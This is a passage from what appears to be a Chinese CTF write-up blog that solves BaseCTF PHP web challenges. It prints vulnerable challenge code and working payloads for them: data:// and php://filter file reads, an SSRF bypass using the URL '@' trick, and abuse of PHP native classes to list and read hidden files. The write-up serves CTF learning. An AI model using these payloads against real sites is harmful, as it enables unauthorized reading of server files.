title=\"第二部分\"></a>第二部分</h3><p>过于简单，直接给payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?tip=我要玩原神</span><br><span class=\"line\">POST:</span><br><span class=\"line\">len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=45&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第三部分\"><a href=\"#第三部分\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$flag</span>[] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"variable\">$ii</span> = <span class=\"number\">0</span>;<span class=\"variable\">$ii</span> &lt; <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>);<span class=\"variable\">$ii</span>++) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$flag</span>[<span class=\"variable\">$ii</span>] = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$array</span>[<span class=\"variable\">$ii</span>]) ^ <span class=\"variable\">$ii</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将输出的密文进行解密</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$md5</span> = [</span><br><span class=\"line\">    <span class=\"string\">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class=\"string\">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>, <span class=\"string\">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class=\"string\">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class=\"string\">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;f457c545a9ded88f18ecee47145a72c0&quot;</span>, <span class=\"string\">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;093f65e080a295f8076b1c5722a46aa2&quot;</span>, <span class=\"string\">&quot;03afdbd66e7929b125f8597834fa83a4&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>, <span class=\"string\">&quot;d82c8d1619ad8176d665453cfb2e55f0&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class=\"string\">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class=\"string\">&quot;07e1cd7dca89a1678042477183b7ac3f&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;a1d0c6e83f027327d8461063f4ac58a6&quot;</span>, <span class=\"string\">&quot;7f6ffaa6bb0b408017b62254211691b5&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>, <span class=\"string\">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class=\"string\">&quot;5fd0b37cd7dbbb00f97ba6ce92bf5add&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;67c6a1e7ce56d3d6fa748ab6d9af3fd7&quot;</span>, <span class=\"string\">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class=\"string\">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>, <span class=\"string\">&quot;da4fb5c6e93e74d3df8527599fa62642&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>, <span class=\"string\">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>, <span class=\"string\">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>, <span class=\"string\">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>, <span class=\"string\">&quot;98f13708210194c475687be6106a3b84&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;3c59dc048e8850243be8079a5c74d079&quot;</span>, <span class=\"string\">&quot;fc490ca45c00b1249bbe3554a4fdf6fb&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class=\"string\">&quot;4e732ced3463d06de0ca9a15b6153677&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;33e75ff09dd601bbe69f351039152189&quot;</span>, <span class=\"string\">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span></span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 用于存储还原出的字符</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$md5</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$j</span> = <span class=\"number\">0</span>; <span class=\"variable\">$j</span> &lt; <span class=\"number\">256</span>; <span class=\"variable\">$j</span>++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 计算异或操作后的值</span></span><br><span class=\"line\">        <span class=\"variable\">$xor_result</span> = <span class=\"variable\">$j</span> ^ <span class=\"variable\">$i</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 计算MD5值</span></span><br><span class=\"line\">        <span class=\"variable\">$calculated_md5</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$xor_result</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 如果计算出的MD5值与给定的MD5值匹配，则找到了正确的字符</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$calculated_md5</span> === <span class=\"variable\">$md5</span>[<span class=\"variable\">$i</span>]) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$flag</span> .= <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$j</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Flag: &quot;</span> . <span class=\"variable\">$flag</span> . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"url-解析规则\"><a href=\"#url-解析规则\" class=\"headerlink\" title=\"url@解析规则\"></a>url@解析规则</h2><h3 id=\"basectf-1\"><a href=\"#basectf-1\" class=\"headerlink\" title=\"basectf\"></a>basectf</h3><h3 id=\"Aura酱的礼物\"><a href=\"#Aura酱的礼物\" class=\"headerlink\" title=\"Aura酱的礼物\"></a>Aura酱的礼物</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">// Aura 酱，欢迎回家~</span></span><br><span class=\"line\"><span class=\"comment\">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class=\"line\"><span class=\"variable\">$pen</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pen&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$pen</span>) !== <span class=\"string\">&#x27;Aura&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class=\"line\"><span class=\"variable\">$challenge</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;challenge&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$challenge</span>, <span class=\"string\">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$blog_content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$challenge</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$blog_content</span>, <span class=\"string\">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class=\"line\"><span class=\"variable\">$gift</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;gift&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$gift</span>); </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第一部分-1\"><a href=\"#第一部分-1\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h3><h4 id=\"data-写入\"><a href=\"#data-写入\" class=\"headerlink\" title=\"data:&#x2F;&#x2F;写入\"></a>data:&#x2F;&#x2F;写入</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$pen</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pen&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$pen</span>) !== <span class=\"string\">&#x27;Aura&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">pen=data://text/plain,Aura</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第二部分-1\"><a href=\"#第二部分-1\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$challenge</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;challenge&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$challenge</span>, <span class=\"string\">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$blog_content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$challenge</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$blog_content</span>, <span class=\"string\">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这里要注意是返回的是challange变量中的<strong>网页内容</strong>，并且网页内容是以<strong>字符串形式返回的</strong></p>\n<blockquote>\n<p>file_get_contents该函数可以从一个文件中读取其内容，并将内容以字符串的形式返回</p>\n</blockquote>\n<h4 id=\"url-解析规则-1\"><a href=\"#url-解析规则-1\" class=\"headerlink\" title=\"url@解析规则\"></a>url@解析规则</h4><p>在url中输入<a href=\"http://jasmineaura.github.io@baidu.com/\">http://jasmineaura.github.io@baidu.com</a>, 最终会解析为后者网站，即为<a href=\"http://baidu.com/\">http://baidu.com</a> </p>\n<h5 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h5><p>将自己服务器写入一个文件，文件内容只要包含<strong>已经收到Kengwang的礼物啦</strong>即可，post**@服务器地址&#x2F;xx.txt**</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">challenge=http://jasmineaura.github.io@121.43.126.238:8009/1.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013221105114.png\" alt=\"image-20241013221105114\"><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013221138526.png\" alt=\"image-20241013221138526\"></p>\n<h5 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h5><p>直接@本地回环地址即可，payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">challenge=http://jasmineaura.github.io@127</span><br><span class=\"line\">.0.0.1 </span><br><span class=\"line\">0.0.0.0</span><br><span class=\"line\">localhost</span><br><span class=\"line\">gz.imxbt.cn:20100 靶场网址</span><br></pre></td></tr></table></figure>\n\n<p>因为**@这几个网址是访问它本身<strong>，并且这个靶机本身就包含已经</strong>收到Kengwang的礼物啦**，即可绕过</p>\n<h3 id=\"最终payload\"><a href=\"#最终payload\" class=\"headerlink\" title=\"最终payload\"></a>最终payload</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST：</span><br><span class=\"line\">pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@0.0.0.0&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"php原生类1\"><a href=\"#php原生类1\" class=\"headerlink\" title=\"php原生类1\"></a>php原生类1</h2><h3 id=\"basectf-2\"><a href=\"#basectf-2\" class=\"headerlink\" title=\"basectf\"></a>basectf</h3><h3 id=\"flag直接读取不就行了？\"><a href=\"#flag直接读取不就行了？\" class=\"headerlink\" title=\"flag直接读取不就行了？\"></a>flag直接读取不就行了？</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$J1ng</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;J&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Hong</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;H&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Keng</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;K&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$Wang</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;W&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$dir</span> = <span class=\"keyword\">new</span> <span class=\"variable\">$Keng</span>(<span class=\"variable\">$Wang</span>);</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>(<span class=\"variable\">$dir</span> <span class=\"keyword\">as</span> <span class=\"variable\">$f</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>(<span class=\"variable\">$f</span> . <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable\">$J1ng</span>(<span class=\"variable\">$Hong</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过于简单直接附上payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET:</span><br><span class=\"line\">?K=FilesystemIterator&amp;W=glob:///secret/*</span><br><span class=\"line\">POST:</span><br><span class=\"line\">SplFileObject&amp;H=php://filter/convert.base64-encode/resource=/secret/f11444g.php</span><br></pre></td></tr></table></figure>\n\n<p>参考文章：<a href=\"https://xz.aliyun.com/t/13785?time__1311=GqmxuQi=e7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\">https://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0</a></p>\n<h2 id=\"php原生类2\"><a href=\"#php原生类2\" class=\"headerlink\" title=\"php原生类2\"></a>php原生类2</h2><p>BaseCTF</p>\n<h3 id=\"1z-php\"><a href=\"#1z-php\" class=\"headerlink\" title=\"1z_php\"></a>1z_php</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\"># 我记得她...好像叫flag.php吧？</span></span><br><span class=\"line\"><span class=\"variable\">$emp</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;e_m.p&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$try</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;try&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$emp</span>!=<span class=\"string\">&quot;114514&quot;</span>&amp;&amp;<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$emp</span>,<span class=\"number\">0</span>)===<span class=\"number\">114514</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$emp</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ctype_alpha</span>(<span class=\"variable\">$emp</span>[<span class=\"variable\">$i</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/.+?HACKER/is&#x27;</span>,<span class=\"variable\">$try</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$try</span>,<span class=\"string\">&#x27;HACKER&#x27;</span>) === <span class=\"literal\">TRUE</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$a</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;php&#x27;</span>)!==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> (<span class=\"keyword\">new</span> <span class=\"variable\">$a</span>(<span class=\"variable\">$b</span>))-&gt;<span class=\"variable\">$c</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span></span><br><span 